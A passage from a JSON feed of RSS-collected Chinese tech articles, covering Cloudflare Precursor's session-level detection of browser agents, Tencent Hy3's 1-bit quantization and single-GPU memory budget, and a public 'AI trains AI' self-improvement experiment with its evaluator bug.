Agent\n身份\n这张图表示信号叠加，不是旧技术退出、新技术接班。到了 agent\n时代，指纹和请求评分仍有用，只是单靠它们越来越难回答操作者是谁。\nBrowser Agent 改变了问题本身\n传统 Web bot 通常执行预先写好的脚本。Browser agent 多了一层 LLM\n推理：它可以阅读页面、规划下一步、调用浏览器工具，遇到错误后再换一种路径。它做的也是人类会做的任务，例如订机票、购物或在论坛发帖。\n这类 agent\n给检测系统带来四个变化。第一，它运行在真实浏览器里，环境属性不再自动暴露其身份。第二，它能处理动态页面和意外分支，不必重复一条固定\nURL 序列。第三，本地 agent 可以从用户设备和住宅网络发出流量，IP\n与网络路径也可能完全正常。第四，robots.txt、User-Agent 和\nWeb Bot Auth\n都依赖\nagent 主动声明；不愿声明的自动化程序仍会伪装成人。\n更麻烦的是，agent\n不天然等于恶意程序。它可能得到用户授权去买票，也可能未经允许抓取内容；一个合法\nagent\n还可能受提示注入影响，开始执行越权动作。网站真正需要分开的，是合法委托、未经许可的自动化和正在发生的危险行为。单一的\nhuman/bot 标签装不下这些差别。\nPlaywright\n淘汰的是一批廉价信号\nPlaywright 是 Browser agent 常用的自动化框架。它可以通过 Chrome\nDevTools Protocol，也就是\nCDP，控制真实浏览器打开页面、点击控件和填写表单。浏览器本身并不假，自动化发生在控制它的那一层。\n这会削弱一批过去成本很低的判断。\nnavigator.webdriver\n可以返回 false，无头浏览器的 User-Agent 可以改写，缺失的多媒体 API\n和粗糙指纹也能补齐。DataDome 的\nGalileo\n研究\n记录了特定 Playwright 版本和路径如何隐藏\nnavigator.webdriver\n。这些信号没有彻底消失，但单独使用时不再可靠。\n真实浏览器仍会留下操作痕迹。agent 可能让指针在 0\n毫秒内跳到目标位置，瞬间滚过长页面，以固定节奏输入文字，或者完全跳过人类阅读和寻找控件的停留时间。CDP\n也可能产生可观察的副作用。把时间窗口拉长以后，焦点、页面可见性、输入事件、请求路径、访问速率、账户状态和最终业务结果还能互相校验。\n所以 Playwright\n改变的不是“网站还能不能检测自动化”，而是检测需要付出多少成本。读一个属性就下结论的时代正在过去，防守方必须采集更长、更密的行为序列，并接受判断只能是概率性的。\nFP-Agent\n用机器学习测试 Agent 行为是否可分\n2026 年，加州大学戴维斯分校的研究者发表了预印本\nFP-Agent\n，专门测量\nBrowser agent\n能否与人类以及彼此区分。这个实验的重要性，不只在于它发现了几个 agent\n怪动作，而在于它把问题写成了一个可训练、可比较的多分类任务。\n研究团队搭建了一个带监测脚本的测试网站，让七种 Browser agent\n完成订机票、购物和论坛互动三类任务。每种 agent 运行 1,000 次，另外招募\n56 名学生，收集了 546 份人类操作样本。研究者提取 418 个浏览器指纹特征和\n50 个行为特征，再用 XGBoost\n分别训练浏览器指纹、行为指纹和混合特征分类器。\n结果显示，两类信号的区分力差了一截。只看浏览器指纹时，分类器的 F1\n大约是 0.8。多个 agent\n共用相似浏览器配置时，模型很容易把它们混在一起。加入打字、滚动和鼠标行为后，行为与混合分类器在这组受控数据里取得接近满分的\nF1。研究者的 FP-Agent 识别了全部七种 agent，而同一研究里的 Cloudflare\n防护只拦下其中一种。\n这并不证明一个 XGBoost 模型已经解决 Agent Detection。实验只有七种\nagent、三类任务和一组学生参与者，软件版本与运行环境也固定。模型可能学到某一版\nagent\n的实现习惯，下一版加入拟人化轨迹后，效果就会下降。论文真正更新的判断是：浏览器属性不够时，agent\n仍会暴露稳定的行为差异；防守方可以用机器学习从这些差异中分类，但必须持续采集新样本、更新特征和重训模型。\n这会形成一场长期竞赛。检测模型学习 agent 的打字和移动方式，agent\n开发者再让动作更像人。FP-Agent\n在这组样本里测出了稳定差异，没有证明这些差异会永久存在，也没有给出生产环境的通用识别率。\nPrecursor 选择持续修正信任\nCloudflare 将\nPrecursor\n定义为客户端、session\n级的行为验证系统。它属于 Enterprise Bot Management，也是 Turnstile\n的可选补充。Turnstile\n擅长在登录、注册和结账等关键时刻做一次验证；Precursor\n补的是这些检查点之间的活动。\n它先在经过 Cloudflare 的 HTML\n响应里动态注入脚本。脚本持续记录指针移动、键盘活动的时间与节奏、焦点变化和页面可见性，再把压缩后的事件送回边缘节点。Cloudflare\n的评估器不只看某个动作快不快，还会交叉检查不同信号：页面不可见时为什么还有指针移动，文本框没有焦点时为什么出现键盘事件，整段轨迹是否前后自洽。\nPrecursor 也改变了做决定的时机。用户通过一次挑战后，不会因此获得整段\nsession 的永久通行证。Cloudflare 的\n更新说明\n写明，系统会随着行为变化重新验证\nchallenge clearance，并用 session 上下文更新 Bot Score。原始行为流由\nCloudflare 内部处理，客户使用的是由它推导出的 session\n上下文、分数和规则结果。后续请求可能被放行、交给 Security Rules\n处理，或再次接受挑战。\n这套设计的核心不是寻找一个能一锤定音的 Agent 指纹。Cloudflare\n选择持续收集许多不完整的证据，让它们互相校验，再随着 session\n展开修正信任。对攻击者来说，改掉一个属性还不够，整段访问都要维持合理行为。对网站来说，也不必自己部署采集服务、实时分类器和处置接口，结果可以直接进入已有的\nCloudflare 规则。\n它最自然的用户，是已经把 Web 或单页应用放在 Cloudflare 后面，并需要\nEnterprise Bot Management\n持续覆盖页面活动的网站运营方。登录、注册、结账之外仍有大段访问需要观察，或团队希望少弹\nCAPTCHA 但继续发现高级自动化，才是它最典型的使用场景。Cloudflare\n同日材料对实际开放范围的描述并不一致，因此不能从这个产品位置反推出哪些账户已经能够使用。它也不负责账户身份验证，不替应用决定某个用户或\nagent 有权做什么。\nCloudflare 表示，Precursor\n只记录键盘活动的时间与节奏，不记录实际字符，也不把行为信号绑定到账户、登录身份或持久个人资料。这限定了它的判断基准：它观察当前\nsession 的行为一致性，不建立某个具体人的长期行为身份。\n竞品在不同位置提高攻击成本\n持续看行为并非 Cloudflare 独有。\nHUMAN\n和\nDataDome\n同样强调\nsession 或完整访问路径，这部分与 Precursor 直接竞争。两家公司还分别提供\nAgenticTrust\n和\nAgentic\nTrust\n，把已声明的 Agent\n身份与访问政策放进相邻的控制层。行为检测和身份治理在产品组合里靠得很近，解决的仍是两个问题。\nKasada\n选择了另一种成本模型。它更重视客户端真实性、代码执行证明和动态代码，让攻击者不断付出逆向与维护代价。\nAkamai Bot\nManager\n和\nImperva\nAdvanced Bot Protection\n则把请求、设备、行为和威胁情报放进企业级 WAAP\n套件。\nArkose\nLabs\n主要在注册、登录、支付等高价值节点施加自适应挑战，目标是直接破坏攻击者的投入产出比。\nFingerprint\n和\nreCAPTCHA Enterprise\n更像信号或升级验证组件，需要客户自己把判断接到业务处置上。\nPrecursor 最清楚的差异不在某一种鼠标特征，而在 Cloudflare\n同时控制脚本分发、边缘评估、Bot Score、挑战和 WAF 规则。已有 Cloudflare\n客户可以少接几层系统，也能让 session\n信号立即影响后续请求。这是分发与集成优势，尚不足以证明它的算法比竞品更准。\n行为检测之后，还缺身份与授权\nPrecursor\n的第一条边界，是所有行为都可以继续模仿。攻击者可以放慢速度、加入停顿、生成鼠标轨迹、维持\nCookie 和账户状态。整段 session\n比一个指纹更难伪造，却不会产生不可伪造的人类证明。检测提高的是成本，不是确定性。\n第二条边界更根本：行为不像人，不代表它不合法。一个得到授权的 agent\n本来就可能没有鼠标轨迹，几秒钟填完表单。反过来，一个有签名身份的 agent\n也可能遭到提示注入或超出用户授权。Agent\n身份、用户委托、业务许可和当前行为是四个问题，任何一层都不能替代其余部分。\n网站治理 Agent\n流量时需要分别判断身份、用户委托、业务权限和当前 Session 行为，Precursor\n只覆盖运行时风险这一层\n无感检测还会把误报藏进后台分数。只用键盘、屏幕阅读器、语音控制、开关输入或远程桌面的用户，可能产生完全不同的轨迹。\nW3C 对 CAPTCHA\n无障碍问题的总结\n没有评估\nPrecursor，却暴露了相同的设计义务：产品需要可访问的升级验证、申诉和人工恢复。Cloudflare\n尚未公开按用户群体划分的误报率，外界也缺少 Precursor\n的独立准确率与性能测试。\n隐私问题也不会因为“不记录实际按键”自动消失。交互时间、session\n标识、保留期限、拒绝采集、模型训练复用和判断审计都需要明确规则。网站运营方至少需要知道数据留多久、谁能访问，以及错误判断如何复查。\n产品状态本身还有一处官方冲突。Cloudflare 在\n2026\n年 7 月 13 日的新闻稿\n中宣布 Precursor 已经 GA；同日技术博客却仍写着\nrolling out，并称产品会免费到当年稍晚的 GA\nrelease。实际开放范围和收费状态仍要以账户与合同为准。\nBrowser agent 让 Bot Detection\n进入了一个更难也更现实的阶段。网站不能再靠真实浏览器属性推断人类意图，也不能把所有自动化都当成攻击。Precursor\n补上运行时行为这一层，却没有替网站解决身份和授权。只有把这些判断接在一起，合法\nagent\n才不必靠模仿人类通行，恶意自动化也不能只换一套浏览器外壳就混过去。",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/cloudflare-precursor-agent-detection-20260716.html",
+      "content_chars": 6067,
+      "content_sha256": "c694d8cfecef63ddc29a6847c8cca7f1012db4d7530feb1fedea21ec56039367",
+      "content_fetched_at": "2026-07-16T22:10:20.215985+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-07-16T00:00:00+00:00",
+      "collected_at": "2026-07-16T22:09:02.312939+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/cloudflare-precursor-agent-detection-20260716.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "Cloudflare Precursor：AI Agent 用上真实浏览器之后，Bot Detection 看什么",
+          "url": "https://yage.ai/share/cloudflare-precursor-agent-detection-20260716.html",
+          "content_sha256": "c694d8cfecef63ddc29a6847c8cca7f1012db4d7530feb1fedea21ec56039367"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:8cb1873e603bdeb4",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "腾讯混元 Hy3 的 1-bit 量化：单卡能装下，离好用还有多远",
+      "target_url": "https://yage.ai/share/hy3-one-bit-single-gpu-20260716.html",
+      "text": "yage-share published: 腾讯混元 Hy3 的 1-bit 量化：单卡能装下，离好用还有多远",
+      "at": "2026-07-16T00:00:00+00:00",
+      "external_id": "a:8cb1873e603bdeb4",
+      "url": "https://yage.ai/share/hy3-one-bit-single-gpu-20260716.html",
+      "title": "腾讯混元 Hy3 的 1-bit 量化：单卡能装下，离好用还有多远",
+      "content": "模型架构\n推理与性能\n中国科技生态\n7 月 14 日，腾讯混元发布了 Hy3 的 IQ1_M 和 Q4_K_M 官方 GGUF\n量化版本。传播最广的数字是：一个 295B 参数的模型压缩后约为 85.5\nGiB，可以加载进单张 96GB 显卡。\n这个数字没有问题，但它只回答了权重能否装下。模型运行时还需要 KV cache\n和计算缓冲，量化也可能影响复杂任务的可靠性。再加上首字等待和生成速度，单卡能加载与日常好用之间，至少还有三笔账。\nHy3 做了怎样的能力取舍\nHy3\n是腾讯混元发布的开源纯文本模型，拥有 295B 总参数、21B 激活参数，支持\n256K 上下文，采用 Apache 2.0 许可。它使用 MoE\n架构，每次只调用一部分专家权重。总参数决定模型的容量，21B\n激活参数则控制每一步实际参与计算的规模。\n这种设计带来了清楚的取舍。根据第三方评测机构\nArtificial Analysis\n的综合测试，Hy3 与 DeepSeek V4-Pro 处在相近区间，但低于\nGLM-5.2\n。具体到任务，网页搜索、长文检索和工具编排是它的相对强项；仓库级\ncoding、终端操作和长程软件工程则弱一些。腾讯混元用较低的激活计算量，换来较宽的\nagent 能力覆盖，没有同时追求最强的 coding 表现。\n同一套综合评测下，Hy3 与 DeepSeek V4-Pro\n接近，但低于 GLM-5.2\n1-bit 并不是整个文件每权重 1\nbit\n量化会用较低精度保存模型权重，从而减少显存占用。\nAngelSlim/Hy3-GGUF\n中最受关注的 IQ1_M，通常被称为 1-bit 版本。\n这里的 1-bit 是量化规格的名称。根据\nHugging\nFace 文件元数据\n，无 MTP 的\nHy3-IQ1_M.gguf\n为 83.30\nGiB，完整文件平均每个权重占 2.425 bit，也就是 2.425 BPW；带 MTP 的版本为\n85.45 GiB、2.488 BPW。Q4_K_M 的无 MTP 版本则是 169.81 GiB。\n实际位宽高于名字，是因为官方没有把所有张量压到同一精度。注意力、共享专家、嵌入和输出等关键路径保留了更多信息，缩放参数和文件元数据也会占空间。IQ1_M\n压得最狠的是大量路由专家权重，整个文件仍是一套混合精度配方。\n96GB 单卡还要给 KV cache\n留位置\n权重加载后，模型还要保存自己读过的上下文。\nKV cache\n就是这些注意力中间结果，输入越长，占用的显存越多。Hy3 使用 q8 KV cache\n时，64K 上下文约需 10.63 GiB。\n把它与权重相加，单卡预算就变得紧张。无 MTP 的 IQ1_M 占 83.30\nGiB，加上 64K q8 KV cache 后达到 93.93 GiB，只剩 2.07 GiB。CUDA\ncontext、计算缓冲、计算图和显存碎片还没有算进去。官方确实提供了单张 H20\n跑 64K 的配置，并把它标为\ntight，但没有公开这套配置的峰值显存和速度日志。它证明方案可以尝试，不足以说明生产运行会很从容。\n带 MTP 的权重是 85.45 GiB。加上同样的主模型 KV\ncache，算术结果已经达到 96.08 GiB，尚未加入 MTP 自己需要的 draft KV\ncache 和其他运行开销。官方的单卡方案因此推荐无 MTP、64K 上下文和 q8 KV\ncache。Hy3 支持 256K，是模型的架构上限，并不代表单张 96GB\n卡也能使用这么长的上下文。\nHy3 IQ1_M 在 96 GiB 单卡中的权重与 64K KV\ncache 预算\n省下的显存，可能由可靠性来付账\n目前，官方没有公开 BF16、FP8、Q4_K_M 和 IQ1_M\n在同一套评测流程下的完整对照。公开说法是：4-bit 在\nagent、代码、工具调用和长文理解上接近 BF16；1-bit\n的长文理解接近原版，agent 和代码能力有小幅回落。\n问题在于，小幅回落落到多步任务里，未必仍然小。一个 coding agent\n要连续选择工具、填写 JSON\n参数、修改代码、判断测试结果。任何一步出现偏差，后面的动作都可能跟着改变。普通问答看不出明显差异，并不能证明长程任务同样可靠。\n这只是风险机制，不是已经测出的 Hy3 IQ1_M 失败率。Hy3\n的参数规模较大，IQ1_M 又会按权重重要性分配不同精度，实际表现可能比朴素的\n1-bit 直觉更好。答案仍要靠真实工作流的 A/B\n测试，尤其要记录格式错误、无效工具调用、重试次数和完整任务成功率。\n速度够交互，长上下文仍然要等\n现有性能数据主要来自社区转换版本，不能直接当成官方 IQ1_M 或 Q4_K_M\n的统一实测。社区 GGUF 在 M3 Max 128GB 上大约能生成 23–25 tok/s；社区 MLX\n版本在 M3 Ultra 上约为 27–29 tok/s。这些速度足以进行日常交互。\nMLX 实测\n与\nGGUF 实测\n使用了不同量化，数字只能用来判断大致体感。\n生成速度也不是全部。模型先读 prompt 的阶段叫 prefill。M3 Max\n上的社区测试约为 41 tok/s，冷读 8K prompt 粗略需要接近 200\n秒。对于上下文很长的 coding\nagent，真正影响节奏的可能是首字等待，而不是后面每秒生成多少 token。\n两张 H200 运行社区 IQ2_M 的测试为 72.2 tok/s，打开 MTP 后达到 81.5\ntok/s。MTP 会一次预测多个后续 token，再由主模型验证。官方宣称它可以提速\n50%–60%，但社区可审计结果高度依赖置信度门控；这组 H200 测试的提升约为\n13%，Apple Silicon 上则基本没有收益。\nllama.cpp PR\n#25395\n记录了这些差异。\n已有 96GB 显卡，可以从无 MTP、16K 或 32K 上下文的 IQ1_M\n开始测试。已有 256GB M3 Ultra，也可以尝试社区 4-bit\nMLX。私有生产部署更适合先评测\nQ4_K_M；使用率不高、数据也不敏感的场景，API 往往更省维护成本。\nHy3\n展示了大模型压缩已经能做到什么，也把代价一并暴露出来：更低的激活计算量、更小的权重文件、较短的现实上下文，以及尚待验证的复杂任务可靠性。它适合已有硬件的人做实验，还不足以成为单独购买高配\nMac 或 H20 的理由。",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/hy3-one-bit-single-gpu-20260716.html",
+      "content_chars": 2703,
+      "content_sha256": "6dd2d3f44a0d49ca9aa73330cd1cbec833de843810f2db3676060ee36dd58afc",
+      "content_fetched_at": "2026-07-16T22:10:20.535476+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-07-16T00:00:00+00:00",
+      "collected_at": "2026-07-16T22:09:02.312939+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/hy3-one-bit-single-gpu-20260716.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "腾讯混元 Hy3 的 1-bit 量化：单卡能装下，离好用还有多远",
+          "url": "https://yage.ai/share/hy3-one-bit-single-gpu-20260716.html",
+          "content_sha256": "6dd2d3f44a0d49ca9aa73330cd1cbec833de843810f2db3676060ee36dd58afc"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    },
+    {
+      "id": "a:444178e8d1142302",
+      "who": "yage-share",
+      "who_url": "https://yage.ai/share/",
+      "action": "publish",
+      "target": "AI Trains AI：一次公开实验如何校准自我改进的故事",
+      "target_url": "https://yage.ai/share/ai-trains-ai-self-improvement-20260715.html",
+      "text": "yage-share published: AI Trains AI：一次公开实验如何校准自我改进的故事",
+      "at": "2026-07-15T00:00:00+00:00",
+      "external_id": "a:444178e8d1142302",
+      "url": "https://yage.ai/share/ai-trains-ai-self-improvement-20260715.html",
+      "title": "AI Trains AI：一次公开实验如何校准自我改进的故事",
+      "content": "AI Agent\n科研与技术前沿\nAI\n自我改进最诱人的地方，是它可能把模型研发变成一个会加速的循环。模型参与生成数据、设计奖励、编写实验并运行训练，再把结果送回下一轮。每转一圈，系统就能尝试更多方案，更快拿到反馈，也可能花更少的钱。\n不过，AI 参与研发，离 AI\n自己推动下一代模型进步还有一段距离。今天的智能体已经能写代码、跑实验，但研究什么、怎样评分、给多少算力、最后是否接受结果，通常仍由人决定。严格意义上的自我改进要求更高：系统不仅要提升下一代模型的核心能力，还要让这种提升在后续迭代中保留下来。现有公开证据主要支持前一种能力，也就是研发自动化。\n过去几年已经有不少公开原型，只是各自接上了不同的一段。\nEureka\n让大模型编写奖励函数，再用强化学习训练内层策略，但写奖励的外层模型并不会随结果更新。\nAI Scientist\n打通了从想法、实验到论文的流程，负责科研的智能体本身却是静态的。\nAlphaEvolve\n能搜索和优化训练内核，Gemini\n自己并不在循环里学习。允许智能体修改代码库的\nDGM\n，同样冻结了基础模型。\nPostTrainBench\n则把自动后训练做成基准测试，结果显示智能体仍明显落后于官方指令微调基线。\nDan Austin 在 2026 年 7 月 14 日发布的\nai-trains-ai\nv0.1\n，把这些分散的环节放进了同一个公开项目。它不是第一个 AI 训练 AI\n的实验，外部研究者也无法完整重放整个过程。但在一个仓库里，我们同时看到了外层策略如何学习、内层模型如何训练、结果能否迁移、运行中出了什么问题、作者报告了多少成本，以及评估器有没有量对。这个项目因此很适合回答一个更具体的问题：所谓自我改进，究竟在哪些地方已经形成反馈循环，又在哪些地方还依赖人类搭好的轨道。\n图\n1：自我改进在成果持久性、代码搜索、权重更新和科研自治等层级的划分。\n一次外层迭代，实际上发生了什么\n项目代码公开在\nGitHub\n，训练后的外层\nLoRA 权重放在\nHugging\nFace\n。发起人\nDan Austin\n在公开履历中自述为微软首席软件工程师，也是仓库里唯一可见的人类维护者。README\n同时写明，Fable 5 编写了项目的每一行代码。Dan\n此前做过计算器强化学习任务、TerminalBench\n基础设施和多智能体评估框架，这些工作最后汇合到了这个项目里。\n外层智能体使用\nQwen3.6。它收到的任务类似“训练一个小模型，让它学会处理多步查询”，但它不直接修改模型权重。它要先交出一份完整的后训练方案，其中包括两类文件：一类定义训练数据、模型可以调用的工具和训练时使用的奖励规则；另一类决定从哪个基础模型开始，以及学习率、训练步数、batch\nsize 等超参数。\n这里的基础模型，是内层训练开始前的起点。项目只允许它在 Qwen3-0.6B 和\nQwen3-1.7B 之间选择。选定以后，GPU 才会从这份原始 checkpoint\n开始做后训练。因此，“选择\n1.7B”不是在两个训练结果中挑赢家，而是在训练开跑之前决定把哪一个模型送进训练流程。\n真正执行内层训练的是\nprime-rl。它是一套运行强化学习后训练的框架，项目默认已经给好了训练配置。外层智能体也可以在作业里的\n[prime_rl]\n配置表中修改采样温度、优化器、算法变体、学习率调度和\nloss。换句话说，prime-rl\n不是另一个被选择的模型，而是负责把这份训练方案实际跑起来的工具。\n作业通过预验证后进入 GPU\n队列，而且只能训练一次。外层智能体看不到训练结果，也没有机会根据结果回来修改方案。训练结束后，隐藏评估程序用一组未公开题目测试小模型，记录训练后的绝对表现，以及它比最佳未训练基线提高了多少。这两项结果再和验证效率、训练速度合成外层\nreward，用来更新智能体的 LoRA。\n所以这个实验里有两层学习。内层小模型按照智能体写出的方案接受后训练；外层智能体则根据每份方案最后拿到的\nreward，逐渐改变自己以后会写出什么方案。人仍然预先规定了任务类型、评估方式、奖励公式、可选模型、工具链和预算。它更像一个正在学习怎样设计后训练实验的智能体，还不是能够独立决定研究方向的科学家。\n图 2：外层智能体生成作业与内层真实训练嵌套构成的反馈回路。\n定量结果：先学会把实验跑通，再学会改善训练结果\n整个外层训练一共进行了 54 步。作者报告的综合 reward 在第 50\n步达到最高值 0.627，第 54 步结束时为 0.549。这个 reward 不是\nloss，也不是科研能力百分比。它是作者为这个环境设计的训练信号：验证效率占\n0.35，内层训练结果占 0.60，训练速度占\n0.05。它的绝对值不能和别的项目比较，作用只是让 GRPO\n知道哪些训练方案以后应该更常出现。\n把综合 reward\n分开以后，学习过程出现了两个阶段。早期的变化主要是实验更常跑通。无效提交减少，通过验证并完成\nGPU\n训练的作业增加，但训练后的小模型并没有明显变好。换句话说，外层智能体先学会了怎样交出一份能执行的训练方案。\n后半程才开始出现和模型效果有关的变化。这里有两个容易混淆的指标。训练后得分，是内层小模型完成后训练以后，在隐藏题目上的表现。训练作业质量分，则把这个训练后得分和“相对最佳未训练模型提高了多少”合成到一起。这里的最佳未训练模型，指\n0.6B 和 1.7B\n在没有接受这次后训练之前，隐藏评测得分较高的那个。按作者的批次聚合口径，作业质量分大约从\n0.30 升到 0.41，训练后得分也从约 0.04 的噪声水平进入 0.22 到 0.48\n的区间。这才是实验中更接近“训练方案开始产生效果”的定量信号。\n这组数字仍要谨慎解释。项目没有公开每次迭代的完整产物，我们无法独立重建每一阶段为什么上涨。训练后得分也只来自项目自己的隐藏合成任务，不代表真实世界里的通用能力。\n模型选择的变化，可以帮助我们看见外层策略具体改了什么。早期只有 42%\n的训练作业从 Qwen3-1.7B 开始，后期这个比例升到 95%。1.7B\n参数更多，通常能力也比 0.6B\n强，但训练更慢、成本更高，而且更大并不保证在有限训练预算下获得更大的提升。智能体可以调用\nget_baseline_scores\n查看两个模型训练前的起始表现，因此这次变化并不深奥：它学会了读取已有信号，把大部分训练预算转向更可能得到高分的起点。这证明外层\nreward 的确改变了策略行为，但还不能算研究品味。\n[prime_rl]\n的使用比例从 21% 升到接近\n78%，则说明越来越多的作业不再完全接受默认训练参数，而是主动设置采样温度、优化器、算法变体、学习率调度和\nloss。它再次证明训练方案的写法发生了变化，但作者没有做消融实验，无法说明其中哪个配置真正改善了结果。\n最后再看没有参与外层训练的任务。项目保留了一个名为 triage\n的任务，四个阶段各测试 10 次，平均分依次是 0.399、0.438、0.545 和\n0.492。第 34 步明显高于起点，第 54\n步又有所回落。这条曲线只支持有限、非单调的迁移：外层策略学到的部分做法可以带到同一类新任务，但现有数据不足以证明稳定而广泛的泛化能力。\n图 3：外层综合奖励变化与 triage 保留任务测试的分数走势。\n评估器量错了，奖励曲线照样会上涨\n项目的\n评估器复盘\n记录了一个很具体的错误。旧版工具使用检测器读取函数名时，寻找的是\n.function.name\n，真实运行对象里却只有\n.name\n。早期单元测试和验证脚本用了另一种数据结构，没有走到这条真实路径。结果，占奖励权重\n0.4 的工具使用得分，在早期测试中一次也没有触发。\n作者写道，旧版实验里看见的奖励上涨，其实发生在这个测量错误制造的假象中。这不能解释成智能体故意作弊。它说明的是另一件事：只要反馈定义有问题，强化学习仍然可以调出一条不断上涨的奖励曲线。评估器不只是实验结束后的计分工具，它本身就是学习环境的一部分。\n发现错误后，作者废弃了旧检查点，重新设计任务和评估标准，并从零开始训练。现在公开的\n54 步曲线，来自修复后的重跑。\n这个实验真正证明了什么\nai-trains-ai\n最有意思的结果不是 reward 达到了\n0.627，而是外层强化学习确实改变了一个训练智能体的行为。它先学会减少无效作业，再逐渐改变基础模型与训练配置的选择；内层小模型完成了真实训练，隐藏评估结果也会反过来更新外层策略。在没有参与训练的\ntriage 任务上，这种变化还出现了有限的迁移。\n但这个结论只在项目预先搭好的环境里成立。任务由人选择，reward\n由人设计，工具与预算由人提供。外层智能体学会的是怎样在这套规则下写出更高分的训练作业。现有证据还不足以说明它获得了通用的研究品味，更不能说明它已经能够自主设计下一代模型。\n以后再看到 AI 自我改进实验，最先应该问的不是 reward\n涨了多少，而是三件事：\n这个 reward 到底在奖励什么？\nreward 上涨后，智能体的具体行为发生了什么变化？\n这些变化是否真的让未参与训练的新任务变得更好？\n这三个问题把代理指标、行为变化和真实结果分开。\nai-trains-ai\n已经把前两步接了起来，也给出了第三步的初步信号。它展示的不是一个已经完成的自我进化系统，而是一次边界清楚、可以继续验证的局部闭环。",
+      "content_format": "text/plain",
+      "content_status": "ok",
+      "content_via": "http",
+      "content_source_url": "https://yage.ai/share/ai-trains-ai-self-improvement-20260715.html",
+      "content_chars": 3902,
+      "content_sha256": "7dabc1acbbceeaa594971efb628da26843c0bb049debc45b643d5bd8226deba3",
+      "content_fetched_at": "2026-07-16T22:10:20.773547+00:00",
+      "author": "yage-share",
+      "author_name": "yage.ai share (Deep News)",
+      "author_url": "https://yage.ai/share/",
+      "published_at": "2026-07-15T00:00:00+00:00",
+      "collected_at": "2026-07-16T22:09:02.312939+00:00",
+      "tags": [
+        "kind:publish",
+        "src:yage-share",
+        "via:rss",
+        "channel:rss"
+      ],
+      "hashtags": [],
+      "links": [
+        "https://yage.ai/share/",
+        "https://yage.ai/share/ai-trains-ai-self-improvement-20260715.html"
+      ],
+      "refs": {
+        "actor": {
+          "login": "yage-share",
+          "url": "https://yage.ai/share/"
+        },
+        "repo": null,
+        "target_user": null,
+        "forkee": null,
+        "source": {
+          "id": "yage-share",
+          "name": "yage.ai share (Deep News)",
+          "home_url": "https://yage.ai/share/"
+        },
+        "article": {
+          "title": "AI Trains AI：一次公开实验如何校准自我改进的故事",
+          "url": "https://yage.ai/share/ai-trains-ai-self-improvement-20260715.html",
+          "content_sha256": "7dabc1acbbceeaa594971efb628da26843c0bb049debc45b643d5bd8226deba3"
+        }
+      },
+      "media": {
+        "photos": [],
+        "videos": []
+      },
+      "metrics": {
+        "circle_count": null,
+        "trending": false,
+        "trending_front_page": false
+      },
+      "flags": {
+        "kind": "publish",
+        "via": "rss",
+        "collect_mode": "rss",
+        "time_precision": "exact",
+        "is_follow": false,
+        "is_repo_event": false,
+        "url_corrected": false,
+        "fetch_status": "ok",
+        "content_status": "ok",
+        "content_via": "http"
+      }
+    }
+  ]
 }
